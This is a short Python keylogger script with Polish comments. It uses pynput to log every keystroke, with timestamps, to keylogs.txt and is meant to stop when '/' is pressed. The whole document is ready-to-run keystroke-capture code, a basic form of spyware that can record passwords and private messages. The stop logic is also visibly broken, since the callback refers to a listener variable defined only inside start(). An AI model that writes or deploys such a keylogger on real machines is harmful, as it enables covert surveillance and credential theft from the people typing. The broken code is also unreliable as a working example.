import pynput.keyboard as keyboard
import logging

# Definicja loggera poza funkcją, aby był dostępny w całym skrypcie
log_file = "keylogs.txt"
logging.basicConfig(filename=log_file, level=logging.INFO, format="%(asctime)s [%(levelname)s]: %(message)s")

def on_key_press(key):
    try:
        key_char = key.char
    except AttributeError:
        key_char = str(key)

    logging.info(f"Key pressed: {key_char}")
    
    # Sprawdzenie, czy naciśnięty klawisz to '/'
    if key_char == '/':
        keyboard_listener.stop()  # Zatrzymanie nasłuchiwania klawiatury
        print("Zatrzymano nasłuchiwanie klawiatury.")

def start():
    # Utworzenie obiektu nasłuchującego klawiaturę
    keyboard_listener = keyboard.Listener(on_press=on_key_press)
    keyboard_listener.start()

    try:
        keyboard_listener.join()
    except KeyboardInterrupt:
        pass
    finally:
        keyboard_listener.stop()
        print("Keylogger zakończony. Logi zapisane w pliku", log_file)

# Wywołanie funkcji start()
start()
